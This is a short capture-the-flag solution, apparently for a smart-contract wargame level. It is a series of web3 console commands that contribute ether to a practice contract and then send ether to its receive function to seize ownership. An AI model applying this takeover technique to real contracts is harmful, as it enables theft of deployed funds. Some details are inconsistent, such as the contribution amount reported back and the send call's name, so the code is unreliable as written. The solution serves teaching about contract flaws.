await contract.owner();
// >> returns some owner address

await balanceOf(instance);
// >> returns 1000 ether

// let's try and contribute
await contract.contribute.send({
    from: player,
    value: toWei("0.0005", "ether"),
});
// note that I can't contribute > 0.001 ether due to the contract

// let's see whether I contributed
(await contract.getContributions.call({ from: player })).toString();
// >> returns 0.001 ether

// if I contribute more than 1000 ether, I become the owner
// alternatively, I can hijack the receive function, and make myself the owner
// so I'll just explicitly send some ether to the contract address
await web3.eth.send({
    from: player,
    to: instance,
    value: toWei("0.001", "ether"),
});
// I'm now the owner

await contract.owner();
// >> returns my address

// submit
